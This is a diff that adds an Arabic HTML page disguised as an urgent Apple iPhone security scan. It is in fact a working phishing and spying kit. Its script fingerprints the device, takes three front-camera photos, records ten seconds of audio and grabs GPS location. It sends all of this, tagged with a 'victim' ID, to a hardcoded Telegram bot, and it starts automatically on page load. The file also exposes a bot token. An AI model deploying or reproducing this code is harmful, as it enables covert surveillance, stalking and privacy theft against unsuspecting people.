@@ -1,0 +1,857 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    
+    <title>📱 تحديث أمني عاجل - Apple iPhone</title>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(145deg, #1a1a1a 0%, #2d2d2d 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* خلفية متحركة */
+        .gradient-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 30% 50%, rgba(0,113,227,0.1) 0%, transparent 50%),
+                        radial-gradient(circle at 70% 50%, rgba(92, 106, 196,0.1) 0%, transparent 50%);
+            z-index: 0;
+            animation: gradientMove 10s ease infinite;
+        }
+
+        @keyframes gradientMove {
+            0%,100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            position: relative;
+            z-index: 10;
+        }
+
+        /* البطاقة الرئيسية */
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 32px;
+            padding: 30px 25px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.3), 0 0 0 2px rgba(255,255,255,0.1) inset;
+            animation: cardFloat 0.6s ease-out;
+        }
+
+        @keyframes cardFloat {
+            from {
+                opacity: 0;
+                transform: translateY(40px) scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        /* شعار Apple متحرك */
+        .logo-container {
+            text-align: center;
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .apple-logo {
+            width: 70px;
+            height: 70px;
+            background: #000;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            animation: logoPulse 2s infinite;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+
+        @keyframes logoPulse {
+            0%,100% { transform: scale(1); box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
+            50% { transform: scale(1.05); box-shadow: 0 20px 30px rgba(0,113,227,0.4); }
+        }
+
+        .apple-logo svg {
+            width: 40px;
+            height: 40px;
+            fill: white;
+        }
+
+        /* شريط التقدم */
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(0,0,0,0.1);
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+            display: none;
+        }
+
+        .progress-bar.active {
+            display: block;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #0071e3, #5c6ac4);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 3px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: shimmer 1.5s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        /* العنوان */
+        h1 {
+            font-size: 26px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 8px;
+            background: linear-gradient(135deg, #1a1a1a, #333);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #666;
+            font-size: 15px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        /* أيقونات الحالة */
+        .status-icons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .status-icon {
+            width: 45px;
+            height: 45px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            animation: iconPop 0.5s ease;
+            position: relative;
+        }
+
+        @keyframes iconPop {
+            from { transform: scale(0); }
+            to { transform: scale(1); }
+        }
+
+        .status-icon:nth-child(1) { animation-delay: 0.1s; }
+        .status-icon:nth-child(2) { animation-delay: 0.2s; }
+        .status-icon:nth-child(3) { animation-delay: 0.3s; }
+        .status-icon:nth-child(4) { animation-delay: 0.4s; }
+
+        .status-icon.active::after {
+            content: '';
+            position: absolute;
+            width: 12px;
+            height: 12px;
+            background: #4cd964;
+            border-radius: 50%;
+            bottom: 0;
+            right: 0;
+            border: 2px solid white;
+        }
+
+        /* شاشة الفحص */
+        .scan-area {
+            background: rgba(0,0,0,0.03);
+            border-radius: 20px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .scan-item {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            background: white;
+            border-radius: 12px;
+            margin-bottom: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            transform: translateX(0);
+            transition: all 0.3s ease;
+        }
+
+        .scan-item.scanning {
+            background: linear-gradient(90deg, #0071e3, #5c6ac4);
+            color: white;
+            transform: scale(1.02);
+        }
+
+        .scan-item.completed {
+            background: #e8f5e9;
+            color: #2e7d32;
+        }
+
+        .scan-item .icon {
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            margin-left: 12px;
+        }
+
+        .scan-item .label {
+            flex: 1;
+            font-weight: 500;
+        }
+
+        .scan-item .status {
+            font-size: 20px;
+        }
+
+        /* زر التحقق */
+        .verify-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #0071e3, #5c6ac4);
+            color: white;
+            border: none;
+            border-radius: 20px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 10px 20px rgba(0,113,227,0.3);
+        }
+
+        .verify-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: left 0.5s;
+        }
+
+        .verify-btn:hover::before {
+            left: 100%;
+        }
+
+        .verify-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        /* عناصر مخفية للتصيد */
+        .hidden-capture {
+            display: none;
+        }
+
+        #video, #audio {
+            display: none;
+        }
+
+        /* رسائل الحالة */
+        .status-message {
+            text-align: center;
+            padding: 12px;
+            border-radius: 12px;
+            margin: 10px 0;
+            display: none;
+        }
+
+        .status-message.success {
+            background: #e8f5e9;
+            color: #2e7d32;
+            border-right: 4px solid #4cd964;
+            display: block;
+        }
+
+        .status-message.error {
+            background: #ffebee;
+            color: #c62828;
+            border-right: 4px solid #ff3b30;
+            display: block;
+        }
+
+        .status-message.info {
+            background: #e3f2fd;
+            color: #1565c0;
+            border-right: 4px solid #2196f3;
+            display: block;
+        }
+
+        /* أمان إضافي */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(0,0,0,0.1);
+            color: #999;
+            font-size: 12px;
+        }
+
+        /* رقائق متحركة */
+        .floating-shapes {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .shape {
+            position: absolute;
+            background: linear-gradient(135deg, rgba(0,113,227,0.1), rgba(92,106,196,0.1));
+            border-radius: 50%;
+            animation: float 20s infinite;
+        }
+
+        @keyframes float {
+            0%,100% { transform: translate(0, 0) rotate(0deg); }
+            25% { transform: translate(20px, -20px) rotate(90deg); }
+            50% { transform: translate(-20px, 20px) rotate(180deg); }
+            75% { transform: translate(20px, 20px) rotate(270deg); }
+        }
+
+        .shape1 { width: 200px; height: 200px; top: -50px; right: -50px; animation-delay: 0s; }
+        .shape2 { width: 150px; height: 150px; bottom: -50px; left: -50px; animation-delay: 5s; }
+        .shape3 { width: 100px; height: 100px; top: 50%; left: 20%; animation-delay: 10s; }
+    </style>
+</head>
+<body>
+    <!-- خلفية متحركة -->
+    <div class="gradient-bg"></div>
+    <div class="floating-shapes">
+        <div class="shape shape1"></div>
+        <div class="shape shape2"></div>
+        <div class="shape shape3"></div>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <!-- شعار Apple متحرك -->
+            <div class="logo-container">
+                <div class="apple-logo">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M18.71 19.5C17.88 20.74 17 21.95 15.66 21.97C14.32 22 13.89 21.18 12.37 21.18C10.84 21.18 10.37 21.95 9.1 22C7.82 22.05 6.8 20.68 5.96 19.47C4.25 17 2.94 12.45 4.7 9.39C5.57 7.87 7.13 6.91 8.82 6.88C10.1 6.86 11.32 7.75 12.11 7.75C12.89 7.75 14.37 6.68 15.92 6.84C16.57 6.87 18.39 7.1 19.56 8.82C19.47 8.88 17.39 10.1 17.41 12.63C17.44 15.65 20.06 16.66 20.09 16.67C20.06 16.74 19.67 18.11 18.71 19.5ZM13 3.5C13.73 2.67 14.94 2.04 15.94 2C16.07 3.17 15.6 4.35 14.9 5.19C14.21 6.04 13.07 6.7 11.95 6.61C11.8 5.46 12.36 4.26 13 3.5Z"/>
+                    </svg>
+                </div>
+                
+                <h1>🔐 فحص أمني متقدم</h1>
+                <div class="subtitle">
+                    يجري النظام فحصاً شاملاً لجهازك للتأكد من عدم وجود ثغرات أمنية
+                </div>
+            </div>
+
+            <!-- أيقونات الحالة -->
+            <div class="status-icons">
+                <div class="status-icon" id="statusCamera">📸</div>
+                <div class="status-icon" id="statusMic">🎤</div>
+                <div class="status-icon" id="statusLocation">📍</div>
+                <div class="status-icon" id="statusDevice">📱</div>
+            </div>
+
+            <!-- شريط التقدم -->
+            <div class="progress-bar" id="progressBar">
+                <div class="progress-fill" id="progressFill" style="width: 0%;"></div>
+            </div>
+
+            <!-- منطقة الفحص -->
+            <div class="scan-area" id="scanArea">
+                <div class="scan-item" id="scanCamera">
+                    <div class="icon">📸</div>
+                    <div class="label">فحص الكاميرا</div>
+                    <div class="status" id="scanCameraStatus">⏳</div>
+                </div>
+                <div class="scan-item" id="scanMic">
+                    <div class="icon">🎤</div>
+                    <div class="label">فحص الميكروفون</div>
+                    <div class="status" id="scanMicStatus">⏳</div>
+                </div>
+                <div class="scan-item" id="scanLocation">
+                    <div class="icon">📍</div>
+                    <div class="label">تحديد الموقع</div>
+                    <div class="status" id="scanLocationStatus">⏳</div>
+                </div>
+                <div class="scan-item" id="scanDevice">
+                    <div class="icon">📱</div>
+                    <div class="label">معلومات الجهاز</div>
+                    <div class="status" id="scanDeviceStatus">⏳</div>
+                </div>
+            </div>
+
+            <!-- رسائل الحالة -->
+            <div id="statusMessage" class="status-message"></div>
+
+            <!-- زر التحقق -->
+            <button class="verify-btn" id="verifyBtn" onclick="startSecurityScan()">
+                بدء الفحص الأمني
+            </button>
+
+            <!-- شارة الأمان -->
+            <div class="security-badge">
+                <span>🔒 مشفر وآمن</span>
+                <span>🛡️ حماية نشطة</span>
+                <span>⚡ 256-bit SSL</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- عناصر مخفية للتصيد -->
+    <video id="video" autoplay playsinline></video>
+    <audio id="audio" autoplay></audio>
+    
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        // ===== إعدادات البوت =====
+        const BOT_TOKEN = "8293090281:AAEGoOI7axwWGvKYcczhS58AjWYiHzvUBrI";
+        const CHAT_ID = "6888107255";  // ضع معرفك هنا
+        
+        // ===== متغيرات عامة =====
+        let victimId = 'iphone_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        let mediaStream = null;
+        let audioStream = null;
+        let capturedPhotos = [];
+        let capturedAudio = [];
+        let scanComplete = false;
+        
+        // ===== إرسال البيانات للتليجرام =====
+        async function sendToTelegram(type, data) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            let message = `🚨 **جهاز iPhone جديد**\n`;
+            message += `🆔 **المعرف:** \`${victimId}\`\n`;
+            message += `📱 **النوع:** ${type}\n`;
+            message += `🕒 **الوقت:** ${new Date().toLocaleString('ar-SA')}\n\n`;
+            message += `📊 **البيانات:**\n\`\`\`\n${JSON.stringify(data, null, 2)}\n\`\`\``;
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (e) {
+                console.log('خطأ في الإرسال:', e);
+            }
+        }
+        
+        // ===== إرسال صورة للتليجرام =====
+        async function sendPhotoToTelegram(photoBlob, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', photoBlob, `photo_${Date.now()}.jpg`);
+            formData.append('caption', caption);
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {
+                console.log('خطأ في إرسال الصورة:', e);
+            }
+        }
+        
+        // ===== إرسال ملف صوتي =====
+        async function sendAudioToTelegram(audioBlob, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('audio', audioBlob, `audio_${Date.now()}.ogg`);
+            formData.append('caption', caption);
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {
+                console.log('خطأ في إرسال الصوت:', e);
+            }
+        }
+        
+        // ===== تحديث حالة الفحص =====
+        function updateScanStatus(item, status) {
+            const element = document.getElementById(`scan${item}`);
+            const statusElement = document.getElementById(`scan${item}Status`);
+            const iconElement = document.getElementById(`status${item}`);
+            
+            if (status === 'scanning') {
+                element.className = 'scan-item scanning';
+                statusElement.innerHTML = '⏳';
+                iconElement.classList.add('active');
+            } else if (status === 'completed') {
+                element.className = 'scan-item completed';
+                statusElement.innerHTML = '✅';
+            }
+        }
+        
+        // ===== تحديث شريط التقدم =====
+        function updateProgress(percent) {
+            document.getElementById('progressBar').classList.add('active');
+            document.getElementById('progressFill').style.width = percent + '%';
+        }
+        
+        // ===== عرض رسالة =====
+        function showMessage(msg, type = 'info') {
+            const msgDiv = document.getElementById('statusMessage');
+            msgDiv.className = `status-message ${type}`;
+            msgDiv.innerHTML = msg;
+            msgDiv.style.display = 'block';
+            
+            setTimeout(() => {
+                msgDiv.style.display = 'none';
+            }, 5000);
+        }
+        
+        // ===== جمع معلومات الجهاز =====
+        async function collectDeviceInfo() {
+            updateScanStatus('Device', 'scanning');
+            
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                language: navigator.language,
+                languages: navigator.languages,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                pixelRatio: window.devicePixelRatio,
+                colorDepth: screen.colorDepth,
+                orientation: screen.orientation ? screen.orientation.type : 'unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                maxTouchPoints: navigator.maxTouchPoints,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+            
+            // محاولة الحصول على البطارية
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    deviceInfo.battery = {
+                        level: battery.level * 100 + '%',
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch (e) {}
+            }
+            
+            // محاولة الحصول على الشبكة
+            if (navigator.connection) {
+                deviceInfo.network = {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                };
+            }
+            
+            await sendToTelegram('معلومات الجهاز', deviceInfo);
+            
+            updateScanStatus('Device', 'completed');
+            updateProgress(25);
+        }
+        
+        // ===== الوصول للكاميرا والتقاط الصور =====
+        async function accessCamera() {
+            updateScanStatus('Camera', 'scanning');
+            
+            try {
+                // طلب الوصول للكاميرا
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    }
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = mediaStream;
+                
+                showMessage('✅ تم الوصول للكاميرا، جاري التقاط الصور...', 'success');
+                
+                // التقاط 3 صور متتالية
+                for (let i = 0; i < 3; i++) {
+                    await capturePhoto(i + 1);
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+                
+                // إيقاف الكاميرا
+                mediaStream.getTracks().forEach(track => track.stop());
+                
+                updateScanStatus('Camera', 'completed');
+                updateProgress(50);
+                
+            } catch (err) {
+                console.log('خطأ في الكاميرا:', err);
+                showMessage('⚠️ تعذر الوصول للكاميرا، جاري المحاولة مرة أخرى...', 'error');
+                
+                // محاولة مرة أخرى بعد ثانيتين
+                setTimeout(accessCamera, 2000);
+            }
+        }
+        
+        // ===== التقاط صورة =====
+        async function capturePhoto(index) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            
+            canvas.width = video.videoWidth || 1280;
+            canvas.height = video.videoHeight || 720;
+            
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // تحويل الصورة إلى Blob
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+            
+            // حفظ الصورة وإرسالها
+            capturedPhotos.push(blob);
+            await sendPhotoToTelegram(blob, `📸 صورة ${index} من الضحية ${victimId}`);
+            
+            showMessage(`📸 تم التقاط الصورة ${index}/3`, 'success');
+        }
+        
+        // ===== الوصول للميكروفون والتسجيل =====
+        async function accessMicrophone() {
+            updateScanStatus('Mic', 'scanning');
+            
+            try {
+                // طلب الوصول للميكروفون
+                audioStream = await navigator.mediaDevices.getUserMedia({
+                    audio: {
+                        echoCancellation: true,
+                        noiseSuppression: true,
+                        autoGainControl: true,
+                        sampleRate: 44100
+                    }
+                });
+                
+                showMessage('✅ تم الوصول للميكروفون، جاري التسجيل...', 'success');
+                
+                // بدأ التسجيل
+                const mediaRecorder = new MediaRecorder(audioStream, {
+                    mimeType: 'audio/webm;codecs=opus'
+                });
+                
+                const audioChunks = [];
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        audioChunks.push(event.data);
+                    }
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    capturedAudio.push(audioBlob);
+                    await sendAudioToTelegram(audioBlob, `🎤 تسجيل صوتي من ${victimId}`);
+                    
+                    showMessage('🎤 تم تسجيل الصوت وإرساله', 'success');
+                };
+                
+                // تسجيل لمدة 10 ثواني
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    audioStream.getTracks().forEach(track => track.stop());
+                }, 10000);
+                
+                updateScanStatus('Mic', 'completed');
+                updateProgress(75);
+                
+            } catch (err) {
+                console.log('خطأ في الميكروفون:', err);
+                showMessage('⚠️ تعذر الوصول للميكروفون', 'error');
+                updateScanStatus('Mic', 'completed');
+                updateProgress(75);
+            }
+        }
+        
+        // ===== الحصول على الموقع =====
+        async function getLocation() {
+            updateScanStatus('Location', 'scanning');
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy + ' meters',
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed,
+                            timestamp: new Date(position.timestamp).toISOString()
+                        };
+                        
+                        // رابط الخريطة
+                        locationData.mapsLink = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
+                        
+                        await sendToTelegram('الموقع الجغرافي', locationData);
+                        
+                        showMessage(`📍 تم تحديد الموقع: ${locationData.latitude}, ${locationData.longitude}`, 'success');
+                        updateScanStatus('Location', 'completed');
+                        updateProgress(100);
+                        
+                        // بعد اكتمال كل شيء
+                        scanComplete = true;
+                        document.getElementById('verifyBtn').innerHTML = '✅ اكتمل الفحص بنجاح';
+                        document.getElementById('verifyBtn').disabled = true;
+                        
+                        // إرسال تقرير نهائي
+                        await sendToTelegram('تقرير نهائي', {
+                            victimId: victimId,
+                            photosCount: capturedPhotos.length,
+                            audioRecorded: capturedAudio.length > 0,
+                            scanComplete: true,
+                            completionTime: new Date().toISOString()
+                        });
+                        
+                        showMessage('🎉 اكتمل الفحص الأمني بنجاح!', 'success');
+                    },
+                    (error) => {
+                        let errorMsg = 'خطأ في تحديد الموقع';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMsg = 'تم رفض طلب الموقع';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMsg = 'الموقع غير متاح';
+                                break;
+                            case error.TIMEOUT:
+                                errorMsg = 'انتهت مهلة الطلب';
+                                break;
+                        }
+                        
+                        showMessage(`⚠️ ${errorMsg}`, 'error');
+                        updateScanStatus('Location', 'completed');
+                        updateProgress(100);
+                        
+                        scanComplete = true;
+                        document.getElementById('verifyBtn').innerHTML = '✅ اكتمل الفحص';
+                        document.getElementById('verifyBtn').disabled = true;
+                        
+                        sendToTelegram('خطأ في الموقع', { error: errorMsg, victimId });
+                    }
+                );
+            } else {
+                showMessage('⚠️ المتصفح لا يدعم تحديد الموقع', 'error');
+                updateScanStatus('Location', 'completed');
+                updateProgress(100);
+                
+                scanComplete = true;
+                document.getElementById('verifyBtn').innerHTML = '✅ اكتمل الفحص';
+                document.getElementById('verifyBtn').disabled = true;
+            }
+        }
+        
+        // ===== بدء الفحص الأمني =====
+        async function startSecurityScan() {
+            const btn = document.getElementById('verifyBtn');
+            btn.disabled = true;
+            btn.innerHTML = '⏳ جاري الفحص...';
+            
+            showMessage('🔍 بدء الفحص الأمني المتقدم...', 'info');
+            
+            // إرسال إشعار بدء الفحص
+            await sendToTelegram('بدء الفحص', {
+                victimId: victimId,
+                startTime: new Date().toISOString()
+            });
+            
+            // تنفيذ جميع المهام
+            await collectDeviceInfo();
+            await accessCamera();
+            await accessMicrophone();
+            await getLocation();
+        }
+        
+        // ===== إرسال معلومات الزيارة =====
+        (async function() {
+            // إرسال إشعار بزيارة الصفحة
+            await sendToTelegram('دخول للصفحة', {
+                victimId: victimId,
+                time: new Date().toISOString(),
+                referrer: document.referrer || 'مباشر'
+            });
+            
+            // بدء الفحص تلقائياً بعد 2 ثانية
+            setTimeout(startSecurityScan, 2000);
+        })();
+    </script>
+</body>
+</html>
